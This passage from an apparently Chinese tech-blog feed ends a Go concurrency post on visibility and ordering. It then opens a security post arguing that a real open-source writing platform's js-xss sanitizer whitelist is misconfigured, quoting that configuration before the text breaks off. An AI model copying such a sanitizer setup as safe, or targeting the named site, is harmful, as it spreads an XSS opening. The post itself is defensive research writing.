class=&quot;token string&quot;&gt;&quot;Never end\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第 5~10 行的 goroutine 會卡在無窮迴圈。&lt;/p&gt;
&lt;p&gt;再說有序性，&lt;a href=&quot;https://golang.org/ref/mem&quot;&gt;官網 blog&lt;/a&gt; 即有提到下面這段 code 不是安全的 concurrncy code:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; b &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;br&gt;	b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這段 code 是有可能先 print 2 再 print 0，因此跨 goroutine 的共有變數使用時，若遇到類似上述的 code，務必要用 lock 等有保證 happen before 的機制保護。&lt;/p&gt;
&lt;p&gt;為了確保有序性和可見性，若真需要共享變數還是必須在變數前後用笨重的 Lock 保護。但高效的 Golang 怎麼會用這麼低效的解法？&lt;/p&gt;
&lt;p&gt;在這篇&lt;a href=&quot;https://blog.golang.org/codelab-share&quot;&gt;官網的 blog&lt;/a&gt; 中我們或許可以找到更適合 Golang 的解法。文章中提到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do not communicate by sharing memory; instead, share memory by communicating.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這也是 Golang 設計 concurrency model 的初衷，使用 &lt;a href=&quot;https://zh.wikipedia.org/wiki/%E4%BA%A4%E8%AB%87%E5%BE%AA%E5%BA%8F%E7%A8%8B%E5%BC%8F&quot;&gt;CSP model&lt;/a&gt;。因此我認為用 channel 來處理可見性和有序性的問題或許是比較 Golang 的做法（如果你還有印象的話，Golang 在 channel 的溝通是有保證 happen-before 的）。&lt;/p&gt;
&lt;p&gt;如可見性範例可以用 chan 在不同的 goroutine 間傳遞 flag 的值：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;&lt;br&gt;	done &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		flag &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; flag &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;br&gt;				&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;End of goroutine\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	done &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而有序性範例也可以用 chan 來傳遞 a, b 的值，因此寫起來可能會像下面這段 code&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; b &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	chana &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	chanb &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;chana&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;chanb&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;		chana &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;br&gt;		chanb &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;br&gt;				&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; chana&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; chanb&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	done &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	chana&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; chanb &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;chana&lt;br&gt;	b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;chanb&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h1&gt;
&lt;p&gt;撰寫 concurrency 的程式最困難的地方是，很多 bug 都是不確定的，無法複製的，這加大了 debug 的難度。&lt;/p&gt;
&lt;p&gt;深入瞭解 concurrency 的議題，以及你寫的每一行 code 背後是如何運行的，可以很大程度的幫助我們避免做錯事。同時，了解這些可以讓我們更體會語言的設計理念，也能幫助我們更好的撰寫符合該語言特性的安全高效 concurrency 程式。&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>防止 XSS 可能比想像中困難</title>
		<link href="https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/"/>
		<updated>2021-05-15T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/</id>
		<content type="html">
		  &lt;h2 id=&quot;%E5%89%8D%E8%A8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%89%8D%E8%A8%80&quot;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;如果你不知道什麼是 XSS（Cross-site Scripting），簡單來說就是駭客可以在你的網站上面執行 JavaScript 的程式碼。既然可以執行，那就有可能可以把使用者的 token 偷走，假造使用者的身份登入，就算偷不走 token，也可以竄改頁面內容，或是把使用者導到釣魚網站等等。&lt;/p&gt;
&lt;p&gt;要防止 XSS，就必須阻止駭客在網站上面執行程式碼，而防禦的方式有很多，例如說可以透過 CSP（Content-Security-Policy）這個 HTTP response header 防止 inline script 的執行或是限制可以載入 script 的 domain，也可以用 &lt;a href=&quot;https://web.dev/trusted-types/&quot;&gt;Trusted Types&lt;/a&gt; 防止一些潛在的攻擊以及指定規則，或是使用一些過濾 XSS 的 library，例如說 &lt;a href=&quot;https://github.com/cure53/DOMPurify&quot;&gt;DOMPurify&lt;/a&gt; 以及 &lt;a href=&quot;https://github.com/leizongmin/js-xss&quot;&gt;js-xss&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;但是用了這些就能沒事了嗎？是也不是。&lt;/p&gt;
&lt;p&gt;如果使用正確那當然沒有問題，但若是有用可是設定錯誤的話，還是有可能存在 XSS 的漏洞。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;前陣子我剛從公司內轉到一個做資安的團隊 &lt;a href=&quot;https://cymetrics.io/zh-tw&quot;&gt;Cymetrics&lt;/a&gt;，在對一些網站做研究的時候發現了一個現成的案例，因此這篇就以這個現成的案例來說明怎樣叫做錯誤的設定，而這個設定又會帶來什麼樣的影響。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C&quot;&gt;#&lt;/a&gt; 錯誤的設定，意料之外的結果&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://matters.news/&quot;&gt;Matters News&lt;/a&gt; 是一個去中心化的寫作社群平台，而且所有的程式碼都有&lt;a href=&quot;https://github.com/thematters&quot;&gt;開源&lt;/a&gt;！&lt;/p&gt;
&lt;p&gt;像是這種部落格平台，我最喜歡看的是他們怎麼處理內容的過濾，秉持著好奇跟研究的心態，可以來看看他們在文章跟評論的部分是怎麼做的。&lt;/p&gt;
&lt;p&gt;Server 過濾的程式碼在這邊：&lt;a href=&quot;https://github.com/thematters/matters-server/blob/bf49f129eb63acaab707609f6a12fced7aaf0f4c/src/common/utils/xss.ts&quot;&gt;matters-server/src/common/utils/xss.ts&lt;/a&gt;：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; xss &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;xss&#39;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;CUSTOM_WHITE_LISTS&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  a&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xss&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;whiteList&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;class&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  figure&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  figcaption&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  source&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;src&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;type&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;  iframe&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;src&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;frameborder&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;allowfullscreen&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;sandbox&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;onIgnoreTagAttr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;tag&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; name&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; value&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token comment&quot;&gt;/**&lt;br&gt;   * Allow attributes of whitelist tags start with &quot;data-&quot; or &quot;class&quot;&lt;br&gt;   *&lt;br&gt;   * @see https://github.com/leizongmin/js-xss#allow-attributes-of-whitelist-tags-start-with-data-&lt;br&gt;   */&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;data-&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; name&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;class&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// escape its value using built-in escapeAttrValue function&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; name &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;=&quot;&#39;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; xss&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;escapeAttrValue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&quot;&#39;&lt;/span&gt;&lt;br&gt;  &lt;span 